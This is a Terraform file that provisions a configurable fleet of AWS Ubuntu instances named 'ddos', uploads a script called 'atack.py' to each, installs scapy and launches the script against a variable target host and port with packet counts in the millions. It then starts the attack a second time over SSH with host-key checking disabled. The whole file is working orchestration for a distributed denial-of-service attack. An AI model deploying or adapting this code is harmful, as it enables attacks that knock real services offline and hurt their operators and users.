provider "aws" {
  region = "us-east-2"
  access_key = "" # input_your
  secret_key = "" # input_your
}

data "aws_ami" "ubuntu" {

  most_recent = true

  filter {
    name   = "name"
    values = ["ubuntu/images/hvm-ssd/ubuntu-focal-20.04-amd64-server-*"]
  }

  filter {
    name   = "virtualization-type"
    values = ["hvm"]
  }

  owners = ["099720109477"]
}

resource "aws_security_group" "webSG" {
  name        = "webSG"
  description = "Allow ssh  inbound traffic"

  ingress {
    from_port   = 22
    to_port     = 22
    self        = false
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  ingress {
    from_port   = 80
    to_port     = 80
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]

  }
}

resource "aws_instance" "ddos" {
  count = var.kozaks

  ami                    = data.aws_ami.ubuntu.id
  instance_type          = "t2.micro"
  vpc_security_group_ids = ["${aws_security_group.webSG.id}"]
  key_name               = aws_key_pair.kozak.key_name

  provisioner "file" {
    source      = "${abspath(path.root)}/atack.py"
    destination = "/tmp/atack.py"
  }
  connection {
    type        = "ssh"
    host        = self.public_ip
    user        = "ubuntu"
    private_key = tls_private_key.kozak.private_key_pem
  }
  provisioner "remote-exec" {
    inline = [
        "set -o errexit",
        "sudo apt update",
        "sudo apt update",
        "sudo apt install python3-scapy -y",
        "screen -d -m sudo python3 /tmp/atack.py -t ${var.goal_atack}  -p ${var.port_atack} -c 100000000",
    ]
  }
}

resource "null_resource" "atack_py" {
  count = length(aws_instance.ddos)
  triggers = {
     hostname = aws_instance.ddos[count.index].private_dns
  }
  provisioner "local-exec" {
    command = "ssh -oStrictHostKeyChecking=no -i ${abspath(path.root)}/kozak_rsa -f ubuntu@${aws_instance.ddos[count.index].public_ip} 'screen -d -m sudo python3 /tmp/atack.py -t ${var.goal_atack}  -p ${var.port_atack} -c 1000000'"
  }
}


resource "aws_key_pair" "kozak" {
  key_name   = "kozak"
  public_key = tls_private_key.kozak.public_key_openssh
}
